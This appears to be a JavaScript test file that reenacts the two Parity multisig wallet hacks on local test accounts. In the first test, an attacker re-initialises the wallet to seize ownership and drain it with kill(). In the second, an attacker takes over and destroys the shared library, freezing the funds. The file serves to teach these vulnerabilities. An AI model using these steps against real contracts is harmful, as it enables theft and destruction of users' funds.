/* global describe it beforeEach artifacts */

import { expect } from 'chai'

const Wallet = artifacts.require('Wallet')
const WalletLibrary = artifacts.require('WalletLibrary')

import { web3 } from './helpers/w3'

const { eth } = web3
const { accounts } = eth

const alice = accounts[0]
const bob = accounts[1]
const carol = accounts[2]
const devops199 = accounts[3]

describe('Parity Wallet Example', () => {
  let wallet
  let proxyWallet
  let walletLibrary

  it('runs Parity hack 1 simulation', async () => {
    walletLibrary = await WalletLibrary.new()
    const proxyWallet = await Wallet.new(walletLibrary.address)

    wallet = await WalletLibrary.at(proxyWallet.address)

    logBalances()

    console.log(`    Alice calls init() on Wallet.sol`)
    await wallet.initContract({from: alice})
    console.log()

    console.log(`    Alice sends 100 ETH to her wallet`)
    await eth.sendTransaction({to: wallet.address, from: alice, value: toWei(100)})

    console.log(`    Bob sends 100 ETH to Alice's wallet`)
    await eth.sendTransaction({to: wallet.address, from: bob, value: toWei(100)})

    logBalances()

    // 1. Alice successfully kills wallet and receives funds
    // console.log(`    Alice calls kill() on her wallet and receives funds`)
    // await wallet.kill({from: alice})

    // 2. Bob cannot kill Alice's wallet
    // console.log(`    Bob trys kill Alice's wallet`)
    // await wallet.kill({from: bob})

    // 3. Carol steals the funds
    console.log(`    Carol calls initContract() on Alice's wallet`)
    await wallet.initContract({from: carol})

    console.log(`    Carol kills Alice's wallet and receives funds`)
    await wallet.kill({from: carol})

    logBalances()

    function logBalances() {
      console.log()
      console.log(`    Balances`)
      console.log(`    ------------------------------------`)
      console.log(`      Alice:         ${fromWeiBigNumber(eth.getBalance(alice))} ETH`)
      console.log(`      Bob:           ${fromWeiBigNumber(eth.getBalance(bob))} ETH`)
      console.log(`      Carol:         ${fromWeiBigNumber(eth.getBalance(carol))} ETH`)

      console.log(`      Wallet:        ${fromWeiBigNumber(eth.getBalance(wallet.address))} ETH`)
      console.log(`      WalletLibrary: ${fromWeiBigNumber(eth.getBalance(walletLibrary.address))} ETH`)
      console.log(`    ------------------------------------`)
      console.log()
    }
  }).timeout(400000)

  it('runs Parity hack 2 simulation', async () => {
    walletLibrary = await WalletLibrary.new()
    const proxyWallet = await Wallet.new(walletLibrary.address)

    wallet = await WalletLibrary.at(proxyWallet.address)

    logBalances()

    console.log(`    Alice calls init() on Wallet.sol`)
    await wallet.initContract({from: alice})
    console.log()

    console.log(`    Alice sends 100 ETH to her wallet`)
    await eth.sendTransaction({to: wallet.address, from: alice, value: toWei(100)})

    console.log(`    Bob sends 100 ETH to Alice's wallet`)
    await eth.sendTransaction({to: wallet.address, from: bob, value: toWei(100)})

    logBalances()

    // Devops199 takes ownership of WalletLibrary
    console.log(`    Devops199 takes ownership of the WalletLibrary by calling initContract()`)
    await walletLibrary.initContract({from: devops199})

    // Devops199 kills the WalletLibrary freezing all funds
    console.log(`    Devops199 calls kill() on the WalletLibrary`)
    await walletLibrary.kill({from: devops199})

    // Allice cannot kill wallet to funds
    console.log(`    Alice trys to kill wallet to get funds`)
    await wallet.kill({from: alice})

    logBalances()

    function logBalances() {
      console.log()
      console.log(`    Balances`)
      console.log(`    ----------------------------------------`)
      console.log(`      Alice:         ${fromWeiBigNumber(eth.getBalance(alice))} ETH`)
      console.log(`      Bob:           ${fromWeiBigNumber(eth.getBalance(bob))} ETH`)
      console.log(`      Devops199:     ${fromWeiBigNumber(eth.getBalance(devops199))} ETH`)

      console.log(`      Wallet:        ${fromWeiBigNumber(eth.getBalance(wallet.address))} ETH`)
      console.log(`      WalletLibrary: ${fromWeiBigNumber(eth.getBalance(walletLibrary.address))} ETH`)
      console.log(`    ----------------------------------------`)
      console.log()
    }
  }).timeout(400000)
})

function toWei(amount) {
  return amount * 10 ** 18
}

function fromWei(amount) {
  return amount / 10 ** 18
}

function fromWeiBigNumber(amount) {
  return amount.div(10 ** 18).toNumber()
}

async function logEvents(asyncFn) {
  const { logs } = await asyncFn

  console.log();
  console.log(`    Found ${logs.length} events`)
  logs.forEach((log) => {
    console.log(log)
  })
  console.log();
}
